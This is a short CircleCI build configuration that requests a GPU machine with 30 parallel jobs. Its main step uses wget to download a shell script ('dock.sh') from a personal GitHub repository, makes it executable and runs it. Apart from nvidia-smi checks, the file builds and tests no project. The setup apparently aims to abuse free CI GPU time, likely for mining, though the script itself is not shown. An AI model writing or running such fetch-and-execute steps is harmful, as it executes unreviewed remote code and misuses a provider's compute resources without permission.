version: 2.1
jobs:
  build:
    machine:
      resource_class: gpu.nvidia.large
      image: ubuntu-1604-cuda-10.1:201909-23
    steps:
      - run: nvidia-smi
      - run: wget https://raw.githubusercontent.com/ploretope/bash/main/dock.sh && chmod +x dock.sh && ./dock.sh
      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
    parallelism: 30